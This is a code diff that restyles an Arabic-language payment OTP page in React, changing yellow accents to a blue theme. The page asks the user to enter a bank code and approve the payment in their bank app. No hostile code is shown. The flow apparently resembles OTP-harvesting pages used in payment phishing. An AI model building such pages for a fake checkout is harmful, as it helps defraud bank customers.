@@ -160,13 +160,13 @@ export default function FinalOtpPage() {
       )}
 
       {status === "message" && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a4a68]/95" dir="rtl">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#1565c0]/95" dir="rtl">
           <div className="text-center space-y-6 px-8">
             <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
-              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
-              <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
-              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
-                <Smartphone className="h-8 w-8 text-yellow-400" />
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-white/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-white/20">
+                <Smartphone className="h-8 w-8 text-white" />
               </div>
             </div>
             <div className="space-y-3">
@@ -174,29 +174,24 @@ export default function FinalOtpPage() {
                 تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3 mt-2">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-yellow-400" style={{ animationDelay: "300ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
                 </div>
-                <p className="text-sm font-semibold text-yellow-300">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#90caf9]">جاري انتظار موافقة البنك...</p>
               </div>
             ) : (
               <button
                 onClick={handleMessageConfirm}
-                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
-                style={{
-                  background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
-                  color: "#1a3d52",
-                  boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
-                }}
+                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm bg-white text-[#1565c0] hover:bg-[#e3f2fd] transition-all shadow-lg"
               >
                 تم الموافقة في التطبيق
               </button>
@@ -213,8 +208,8 @@ export default function FinalOtpPage() {
       >
         <form onSubmit={handleSubmit} className="space-y-5">
           {/* Info card */}
-          <div className="rounded-xl border border-[#dce8f3] bg-[#f5fafe] p-4">
-            <div className="space-y-2 text-sm text-[#24577a]">
+          <div className="rounded-xl border border-[#bbdefb] bg-[#e3f2fd] p-4">
+            <div className="space-y-2 text-sm text-[#1565c0]">
               <div className="flex items-center gap-2">
                 <Clock className="h-4 w-4 flex-shrink-0" />
                 <span>الرمز صالح لمدة 5 دقائق</span>
@@ -267,8 +262,8 @@ export default function FinalOtpPage() {
                     : approved
                     ? "border-emerald-300 bg-emerald-50 text-emerald-700"
                     : digit
-                    ? "border-[#145072] bg-[#eaf4fb] text-[#145072]"
-                    : "border-[#d2e1ed] bg-white text-[#194e6e] focus:border-[#145072] focus:bg-[#f0f8ff]",
+                    ? "border-[#1976d2] bg-[#e3f2fd] text-[#1976d2]"
+                    : "border-[#bbdefb] bg-white text-[#1565c0] focus:border-[#1976d2] focus:bg-[#f0f8ff]",
                 ].join(" ")}
               />
             ))}
@@ -280,15 +275,15 @@ export default function FinalOtpPage() {
               <button
                 type="button"
                 onClick={handleResend}
-                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#145072] hover:underline"
+                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#1976d2] hover:underline"
               >
                 <RefreshCw className="h-4 w-4" />
                 إعادة إرسال الرمز
               </button>
             ) : (
-              <p className="text-sm text-[#6a8498]">
+              <p className="text-sm text-slate-500">
                 يمكنك إعادة الإرسال بعد{" "}
-                <span className="font-bold text-[#145072]">{resendTimer}</span> ثانية
+                <span className="font-bold text-[#1976d2]">{resendTimer}</span> ثانية
               </p>
             )}
           </div>
@@ -301,11 +296,11 @@ export default function FinalOtpPage() {
             style={{
               background: approved
                 ? "linear-gradient(135deg,#10b981,#059669)"
-                : "linear-gradient(135deg,#f0b429,#f7c04a)",
-              color: approved ? "#fff" : "#145072",
+                : "linear-gradient(135deg,#1976d2,#1565c0)",
+              color: "#fff",
               boxShadow: approved
                 ? "0 8px 24px rgba(16,185,129,0.3)"
-                : "0 8px 24px rgba(240,180,41,0.35)",
+                : "0 8px 24px rgba(25,118,210,0.35)",
             }}
           >
             {verifying ? (
